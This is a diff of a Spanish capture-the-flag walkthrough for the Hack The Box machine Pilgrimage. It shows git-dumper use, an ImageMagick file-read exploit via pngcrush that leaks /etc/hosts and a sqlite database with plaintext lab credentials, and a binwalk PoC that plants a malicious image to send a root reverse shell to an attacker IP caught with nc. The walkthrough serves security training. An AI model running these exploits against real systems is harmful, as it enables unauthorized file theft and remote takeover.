@@ -33,6 +33,14 @@ Nmap done: 1 IP address (1 host up) scanned in 41.01 seconds
 
 ## Website 
 
+La web me muestra una seccion donde puedo subir archivos, de los cuales esos se va a comprimir (encoger), por asi decir.
+
+![image-center](/assets/images/Pasted image 20251218021210.png)
+
+Intente métodos de bypass para intentar subir un archivo `.php` malicioso pero no tuve éxito ya que cualquier archivo lo sube y le cambia la extensión o extensiones a `.jpeg`.
+### Feroxbuster enumeration
+
+El escaneo no revela rutas nuevas ni nada.
 ```bash
 feroxbuster -u http://pilgrimage.htb -C 404 -x php,xml
 <SNIP>
@@ -45,6 +53,8 @@ feroxbuster -u http://pilgrimage.htb -C 404 -x php,xml
 ```
 
 ## Git repository
+
+Usando la tool `dirsearch` me descubre el directorio `/.git/`.
 
 ```bash
 dirsearch -u http://pilgrimage.htb
@@ -63,6 +73,8 @@ Target: http://pilgrimage.htb/
 
 ### Git-dumper
 
+Por lo que use [git-dumper](https://github.com/arthaud/git-dumper) para poder extraer los datos interesantes de ese repositorio.
+
 ```bash
 python3 git_dumper.py http://pilgrimage.htb/ git     
 [-] Testing http://pilgrimage.htb/.git/HEAD [200]
@@ -76,6 +88,8 @@ python3 git_dumper.py http://pilgrimage.htb/ git
 [-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
 <SNIP>
 ```
+
+Una vez termina, veo los archivos que hacen funcionar a la pagina, entre ellos este.
 
 ```bash
 cat dashboard.php 
@@ -98,7 +112,11 @@ function fetchImages() {
   $allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);
   return json_encode($allImages);
 ```
+
+Es así como veo que los datos se guardan en la base de datos `/var/db/pilgrimage`, la cual es `sqlite`, esto es un dato interesante para mas adelante.
 ## Exploit
+
+También en la misma carpeta me dejo el binario de `ImageMagik`, con una versión.
 
 ```bash
 ./magick --version
@@ -110,19 +128,26 @@ Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma
 Compiler: gcc (7.5)
 ```
 
-[enlace](https://www.hackplayers.com/2023/02/imagemagick-la-vulnerabilidad-oculta.html)
+Buscando por exploit para esta versión, llegué a este [enlace](https://www.hackplayers.com/2023/02/imagemagick-la-vulnerabilidad-oculta.html) donde muestra como dentro de una imagen, un atacante puedo colocar datos, los cuales cuando se realiza un `shrink` de dicha imagen, el contenido que insertemos se interprete, y de esta manera puedo leer archivos locales de la maquina.
 ### Example
+
+Para ver si este PoC funciona, primero tengo que instalar las dependencias.
+
 ```bash
 apt-get install pngcrush imagemagick exiftool exiv2 -y
 ```
 
+Y luego insertar el nombre del archivo a `exfiltrar` dentro de la imagen.
+
 ```bash
-pngcrush -text a "profile" "/etc/hosts" gatt.png
+pngcrush -text a "profile" "/etc/hosts" gato.png
 ```
 
-```url
-http://pilgrimage.htb/shrunk/694362c82ee7c.png
-```
+Por esto me deja una imagen "`malicosa`" la cual la subo a la pagina.
+
+![image-center](/assets/images/Pasted image 20251218022107.png)
+
+Yendo a la `url` me aparece mi imagen, la descargo y sigo con el proceso.
 
 ```bash
 identify -verbose test.png  
@@ -139,7 +164,9 @@ identify -verbose test.png
 <SNIP>
 ```
 
-```
+Ahora que tengo la data en hexadecimal, uso `python3` para decodificarla, lo que me da como resultado, el contenido del archivo `/etc/hosts` de la maquina victima.
+
+```bash
 python3 -c 'print(bytes.fromhex("3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c6772696d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f75746572730a").decode("utf-8"))'                                                                              
 127.0.0.1 localhost
 127.0.1.1 pilgrimage pilgrimage.htb
@@ -148,19 +175,27 @@ python3 -c 'print(bytes.fromhex("3132372e302e302e31096c6f63616c686f73740a3132372
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-
 ```
+## Shell as emily
+
+Puedo repetir el proceso, pero ahora con la base de datos, que es el único dato que conozco, solo que para poder decodificar los datos use `xxd` ya que con `python3`, devuelve caracteres no legibles. Puedo usarl el mismo y enviar la data a un archivo para luego analizarlo
+
 ```bash
- cat data  | tr -d '\n' | xxd -r -p                                                                                                                                                     
+ cat data  | tr -d '\n' | xxd -r -p > database.sqlite
+         
 ��e��8|�StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf�+tableusersusersCREATE��▒-emilyabigchonkyboi123XT PRIMARY KEY NOT NULL, password TEXT NOT NULL))=indexsqlite_autoindex_users_1users
 ��emily
 ```
-## Sqlite file
+### Sqlite file
+
+Ahora examinando el contenido del archivo, veo que si es una base de datos de `SQLite3`.
 
 ```bash
  file database.sqlite 
 database.sqlite: SQLite 3.x database, last written using SQLite version 3034001, file counter 80, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 80
 ```
+
+Por lo que puedo usar el siguiente comando para conectarme.
 
 ```bash
 sqlite3 database.sqlite 
@@ -170,6 +205,8 @@ sqlite>
 ```
 ### Credentials
 
+Listo tablas, y extraigo el contenido de las mismas.
+
 ```bash
 sqlite> .tables
 images  users 
@@ -177,6 +214,7 @@ sqlite> select * from users;
 emily|abigchonkyboi123
 ```
 
+Y las credenciales encontradas son validas para loguearme vía `ssh`
 ```bash
  ssh emily@pilgrimage.htb 
 <SNIP>
@@ -186,6 +224,7 @@ f3b70f1c64379878013e0e9ebf2b9a6c
 ## Shell as root
 ### Proccess
 
+Listando procesos, veo uno que no es muy común, lo que parece ser un script personalizado que corre como el usuario `root`.
 ```bash
 ps -faux 
 <SNIP>
@@ -195,6 +234,8 @@ root         722  0.0  0.0   6816  2384 ?        S    11:20   0:00  \_ /bin/bash
 <SNIP>
 ```
 ## Script
+Analizando el contenido del mismo, lo que mas destaca es que con `binwalk` examina las imágenes, que están en el directorio `/var/www/pilgrimage.htb/shrunk/`.
+
 ```bash
 emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
 #!/bin/bash
@@ -213,13 +254,17 @@ blacklist=("Executable script" "Microsoft executable")
 done
 ```
 ### CVE
+
+Buscando la versión obtengo esta.
+
 ```bash
 emily@pilgrimage:~$ /usr/local/bin/binwalk
 
 Binwalk v2.3.2
 <SNIP>
 ```
-[PoC](https://www.exploit-db.com/exploits/51249)
+
+La versión que encontré tiene una vulnerabilidad la cual me permite ejecutar códigos, y por ende en este caso escalar mis privilegios al usuario `root`, para eso encontré este [PoC](https://www.exploit-db.com/exploits/51249) en `python3`, ademas para el uso del mismo necesito de una imagen cualquiera, por lo que me transferí la mía a la maquina con `wget`
 
 ```bash
 emily@pilgrimage:/tmp$ wget http://10.10.17.19/gatt.png
@@ -232,12 +277,16 @@ Saving to: ‘gatt.png’
 gatt.png                                       100%[===================================================================================================>]  59.96K  36.9KB/s    in 1.6s   
 ```
 
+Ejecute el script colocando la `ip`, `puerto` a la que se envía la `shell`, y la imagen la cual va a ser tomada de referencia para crear la maliciosa.
+
 ```bash
 emily@pilgrimage:/tmp$ python3 binwalk.py gatt.png 10.10.17.19 4444
 <SNIP>
 You can now rename and share binwalk_exploit and start your local netcat listener.
 ```
 ### Malicious image
+
+Ahora ya tengo la imagen maliciosa.
 
 ```bash
 emily@pilgrimage:/tmp$ ls
@@ -247,9 +296,13 @@ gatt.png             test
 ```
 ## Shell
 
+La copio al directorio, en el cual se va a examinar.
+
 ```bash
 emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/binwalk_exploit.png
 ```
+
+Y como es previsto desde mi listener `nc` recibo la conexión como el usuario `root`.
 
 ```bash
 sudo nc -nlvp 4444
